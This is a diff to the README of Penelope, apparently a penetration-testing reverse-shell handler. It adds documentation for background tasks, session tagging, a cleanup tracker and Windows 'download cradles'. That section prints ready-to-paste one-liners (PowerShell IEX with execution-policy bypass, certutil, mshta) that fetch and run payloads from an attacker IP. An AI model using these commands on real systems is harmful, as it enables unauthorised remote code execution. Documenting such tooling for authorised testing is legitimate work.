@@ -16,6 +16,10 @@ Penelope is a powerful shell handler built as a modern netcat replacement for RC
   - [tmux Auto-Split](#tmux-auto-split)
   - [Windows Improvements](#windows-improvements)
   - [In-Session Command Mode](#in-session-command-mode-ctrlo)
+  - [Background Exec](#background-exec)
+  - [Session Tagging](#session-tagging)
+  - [PowerShell Download Cradles](#powershell-download-cradles)
+  - [Cleanup Tracker](#cleanup-tracker)
   - [UX Improvements](#ux-improvements)
   - [Security Hardening](#security-hardening)
   - [Bug Fixes](#bug-fixes)
@@ -87,11 +91,112 @@ Available commands:
   sessions                 List active sessions
   listeners                List active listeners
   interfaces               Show network interfaces
+  tasks                    Show background tasks
   help                     Show this help
 root@target:~#
 ```
 
 Works in both regular attached sessions and tmux auto-split panes. The shell stays active while you run commands — no need to detach to the Main Menu.
+
+## Background Exec
+
+Run long commands (linpeas, bloodhound, scans) without blocking your session. Output is logged to file and tailed in a separate terminal pane.
+
+```
+(Penelope)─(Session [1])> exec -b /tmp/linpeas.sh
+[*] Background task 1 started: /tmp/linpeas.sh
+[*] Output: ~/.penelope/1~10.10.14.5-Linux-x86_64/tasks/task_1.log
+
+(Penelope)─(Session [1])> tasks
+  ID | Session | Command            | Started             | Status  | Output
+   0 |       1 | /tmp/linpeas.sh    | 2026-03-01 14:22:03 | Running | task_1.log
+
+(Penelope)─(Session [1])> tasks kill 0
+[*] Sent stop signal to task 0
+```
+
+- `exec -b <command>` spawns the command in a background thread
+- Output logged to the session's `tasks/` directory with `tail -f` opened in a new terminal/tmux pane
+- `tasks` lists all background tasks across sessions with status (Running/Done)
+- `tasks kill N` stops a running task
+- Also available via Ctrl+O `tasks` from inside a shell
+- Agent sessions run on separate streams and don't block foreground exec; non-agent sessions hold the session lock
+
+## Session Tagging
+
+Label sessions for easy identification when managing multiple shells:
+
+```
+(Penelope)> tag 1 webshell
+[*] Tagged session 1 as webshell
+
+(Penelope)> tag 2 privesc
+[*] Tagged session 2 as privesc
+
+(Penelope)> sessions
+➤  target1~10.10.11.5 Linux-x86_64
+     ID | Shell | User     | Tag      | Source
+      1 | PTY   | www-data | webshell | TCPListener(0.0.0.0:4444)
+      2 | PTY   | root     | privesc  | TCPListener(0.0.0.0:4444)
+
+(Penelope)> tag 1 none
+[*] Removed tag from session 1
+```
+
+- `tag <label>` tags the current session
+- `tag N <label>` tags session N
+- `tag none` / `tag N none` removes the tag
+- Tags display in magenta in `sessions` and `info` output
+
+## PowerShell Download Cradles
+
+The `payloads` command now includes Windows-specific download cradles alongside Unix reverse shells:
+
+```
+➤  tun0 → 10.10.14.5:4444
+
+  Bash TCP
+  printf ...|base64 -d|bash
+
+  Netcat + named pipe
+  printf ...|base64 -d|sh
+
+  Powershell
+  cmd /c powershell -e ...
+
+  Metasploit
+  set PAYLOAD generic/shell_reverse_tcp
+  ...
+
+  Windows Download Cradles
+
+  PowerShell IEX (in-memory)
+  powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:4444/shell.ps1')"
+
+  Certutil (disk drop)
+  certutil -urlcache -split -f http://10.10.14.5:4444/shell.exe %TEMP%\shell.exe && %TEMP%\shell.exe
+
+  MSHTA (in-memory)
+  mshta http://10.10.14.5:4444/shell.hta
+```
+
+Three cradles per listener interface — ready to paste into a target with the correct IP and port already filled in.
+
+## Cleanup Tracker
+
+When a session dies, penelope now automatically warns about uploaded files left behind on the target:
+
+```
+[-] Session [1] died... We lost target1
+[!] Session [1] left 3 uploaded file(s) on target:
+[!]   /tmp/linpeas.sh
+[!]   /tmp/pspy64
+[!]   /tmp/chisel
+```
+
+- Fires automatically on session death — no action required
+- Non-interactive warning only (no commands sent to a dying session)
+- Manual `run cleanup` still works as before on live sessions to interactively delete files
 
 ## Windows Improvements
 
@@ -256,9 +361,12 @@ pipx install penelope-shell-handler
 |Upload local/HTTP files/folders|✅|✅|✅|
 |In-memory local/HTTP script execution with real-time output downloading|✅|❌|❌|
 |Local port forwarding|✅|❌|❌|
+|Background exec (`exec -b`)|✅|✅|✅|
+|Session tagging (`tag`)|✅|✅|✅|
 |Spawn shells on multiple tabs and/or hosts|✅|✅|❌|
 |Maintain X amount of active shells per host no matter what|✅|✅|❌|
 |Auto-split tmux panes on new sessions (-A)|✅|✅|✅|
+|Cleanup tracker (auto-warn on session death)|✅|✅|✅|
 
 (*) opens a second TCP connection
 
